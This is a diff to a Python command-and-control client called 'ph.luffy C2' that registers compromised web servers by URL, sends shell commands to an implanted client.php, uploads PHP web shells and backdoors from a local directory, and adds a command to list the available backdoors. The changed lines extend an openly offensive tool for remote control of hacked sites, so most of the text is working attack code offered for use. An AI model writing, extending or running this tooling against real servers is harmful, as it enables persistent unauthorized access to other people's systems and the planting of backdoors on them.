@@ -1,19 +1,16 @@
-import requests, json, os, base64, platform
-import sys
+import requests, json, os, base64, platform, sys, argparse
 
 # ANSI color codes
 GREEN = "\033[92m"
 SILVER = "\033[37m"
 BLUE = "\033[94m"
+RED = "\033[1;31m"
 YELLOW = "\033[93m"
 RESET = "\033[0m"
-
 SESSION_FILE = "_sessions.json"
-
 TOOL_NAME = "ph.luffy C2"
 TOOL_VERSION = "1.0"
 TOOL_AUTHOR = "Coded by ph.luffy"
-
 GITHUB_RAW_URL = "https://raw.githubusercontent.com/kaitolegion/c2/main/assets/c2.py"
 
 def check_for_update():
@@ -82,11 +79,18 @@ def banner():
         server = sessions[sid].get("server", "unknown")
         print(f"{BLUE}[{i}]{RESET} {sid} - {server}")
     print(SILVER + "-" * 40 + RESET)
-    print(f"{GREEN}[+] Commands:{RESET}")
-    print(f"{SILVER}[*] spawn shell [name]{RESET} :   {SILVER}Upload your shell (location: /[name]){RESET}")
+    print(f"{GREEN}[+] Commands:{RESET} (only when connected)")
+    print(f"{SILVER}[*] spawn shell [name]{RESET} :   {SILVER}Upload your shell (e.g, spawn shell up.php){RESET}")
+    print(f"{SILVER}[*] spawn list{RESET}         :   {SILVER}List of available backdoors{RESET}")
     print(f"{SILVER}[*] about{RESET}              :   {SILVER}About this tool{RESET}")
     print(f"{SILVER}[*] clear{RESET}              :   {SILVER}Clear commands{RESET}")
+    print(f"{SILVER}[*] exit{RESET}               :   {SILVER}Back to home{RESET}")
+    print(SILVER + "-" * 40 + RESET)
+    print(f"{GREEN}[+] Commands:{RESET} (not connected)")
+    print(f"{SILVER}[*] n{RESET}                  :   {SILVER}For new target{RESET}")
     print(f"{SILVER}[*] kill [num]{RESET}         :   {SILVER}Remove session number [num]{RESET}")
+    print(f"{SILVER}[*] update{RESET}             :   {SILVER}Check for updates{RESET}")
+    print(f"{SILVER}[*] CTRL+C{RESET}             :   {SILVER}Exit the program{RESET}")
     print(SILVER + "-" * 40 + RESET)
 
 def load_sessions():
@@ -104,16 +108,37 @@ def save_sessions(sessions):
     with open(SESSION_FILE, "w") as f:
         json.dump(sessions, f, indent=4)
 
-def register():
-    new_server = input(f"{BLUE}Enter new target (e.g https://target.com/client.php): {RESET}")
-    r = requests.get(new_server, params={"action": "register"})
-    r.raise_for_status()
-    session = r.json()
-    session["server"] = new_server
-    sessions = load_sessions()
-    sessions[session["id"]] = session
-    save_sessions(sessions)
-    return session
+def register(new_server=None):
+    while True:
+        if new_server is None:
+            new_server = input(f"{BLUE}Enter new target: {RESET}").strip()
+        if not new_server:
+            print(f"{YELLOW}[!]{RESET} URL cannot be empty. Please enter a valid URL (e.g., http://target/path/client.php)")
+            new_server = None
+            continue
+        if not (new_server.startswith("http://") or new_server.startswith("https://")):
+            print(f"{YELLOW}[!]{RESET} URL must start with http:// or https://")
+            new_server = None
+            continue
+        try:
+            r = requests.get(new_server, params={"action": "register"})
+            r.raise_for_status()
+            session = r.json()
+            session["server"] = new_server
+            sessions = load_sessions()
+            sessions[session["id"]] = session
+            save_sessions(sessions)
+            return session
+        except requests.exceptions.MissingSchema:
+            print(f"{YELLOW}[!]{RESET} Invalid URL. Please include the scheme (http:// or https://).")
+        except requests.exceptions.ConnectionError:
+            print(f"{YELLOW}[!]{RESET} Could not connect to {new_server}. Please check the URL and try again.")
+        except requests.exceptions.HTTPError as e:
+            print(f"{YELLOW}[!]{RESET} HTTP error: {e}")
+        except Exception as e:
+            print(f"{YELLOW}[!]{RESET} Error: {e}")
+        # Prompt again if error
+        new_server = None
 
 def send_command(session, cmd):
     server = session.get("server")
@@ -143,7 +168,6 @@ def about_tool():
     print(BLUE + "=" * 40 + RESET)
 
 def upload_shell(session, shell_name="shell.php"):
-    # Try scripts/bd/ first, then current directory
     possible_paths = [
         os.path.join(os.getcwd(), "scripts", "bd", shell_name),
         os.path.join(os.getcwd(), shell_name)
@@ -174,20 +198,27 @@ def upload_shell(session, shell_name="shell.php"):
 # -------- MAIN --------
 
 def main():
+    parser = argparse.ArgumentParser(description="ph.luffy C2")
+    parser.add_argument('-n', '--new', metavar='URL', help='Register new target (e.g., https://target.com/client.php)')
+    args = parser.parse_args()
+
+    clear_screen()
     # check first if there is update
     check_for_update()
-
     global sessions
     sessions = load_sessions()
-
     try:
-        if sessions:
+        session = None
+        # If -n/--new argument is provided, register new target immediately
+        if args.new:
+            session = register(args.new)
+        elif sessions:
             banner()
             while True:
                 try:
-                    choice = input(f"{BLUE}[*] Select session number, 'n' for new, or 'kill [num]': {RESET}").strip()
+                    choice = input(f"{GREEN}px@security{RED}~{BLUE}$ {RESET}").strip()
                 except KeyboardInterrupt:
-                    print(f"\n{YELLOW}[!]{RESET} KeyboardInterrupt detected. Exiting.")
+                    print(f"\n{YELLOW}[!]{RESET} Exiting.")
                     sys.exit(0)
                 if choice.lower() == "n":
                     session = register()
@@ -223,19 +254,24 @@ def main():
                         print(f"{YELLOW}[!]{RESET} Invalid choice. Try again or use 'n' or 'kill [num]'.")
         else:
             session = register()
-
         print(f"{GREEN}[+]{RESET} session connected: {BLUE}{session['id']}{RESET}")
-
         while True:
             try:
-                cmd = input(f"{SILVER}PX({BLUE}{session['id']}{SILVER})> {RESET}").strip()
+                cmd = input(f"{GREEN}px@security({RED}{session['id']}{SILVER})$ {RESET}").strip()
             except KeyboardInterrupt:
                 print(f"\n{YELLOW}[!]{RESET} KeyboardInterrupt detected. Exiting.")
                 break
 
             # Special commands
             if cmd.lower() in ["exit", "quit"]:
-                break
+                # On exit, reset session's cwd to home (if possible)
+                if 'home' in session:
+                    session['cwd'] = session['home']
+                    # Optionally, update the session on disk
+                    sessions[session['id']] = session
+                    save_sessions(sessions)
+                print(f"{YELLOW}[!]{RESET} Returning to session selection/home.")
+                return main()  # Go back to main menu
             elif cmd.lower() == "clear":
                 clear_screen()
                 continue
@@ -251,7 +287,16 @@ def main():
                     shell_name = "shell.php"
                 upload_shell(session, shell_name)
                 continue
-
+            elif cmd.lower().startswith("spawn list"):
+                files_dir = "scripts/bd/"
+                try:
+                    files = os.listdir(files_dir)
+                    print(f"{GREEN}[+]{RESET} Available:")
+                    for f in files:
+                        print(f"  {SILVER}{f}{RESET}")
+                except Exception as e:
+                    print(f"{YELLOW}[!]{RESET} Could not list files in {files_dir}: {e}")
+                continue
             # Send to target
             send_command(session, cmd)
             output = get_last_output(session)
